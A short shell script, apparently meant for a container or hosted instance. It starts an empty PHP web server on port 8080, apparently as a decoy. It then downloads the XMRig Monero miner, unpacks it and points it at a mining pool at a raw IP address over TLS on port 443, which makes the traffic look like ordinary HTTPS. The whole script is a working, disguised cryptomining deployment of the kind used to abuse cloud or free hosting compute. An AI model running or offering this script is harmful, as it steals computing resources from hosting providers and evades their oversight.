cd /home
apt-get update
touch index.php
php -S 0.0.0.0:8080 &
wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
xmrig-6.16.2/xmrig -o 103.95.197.2:443 --randomx-no-rdmsr --tls true
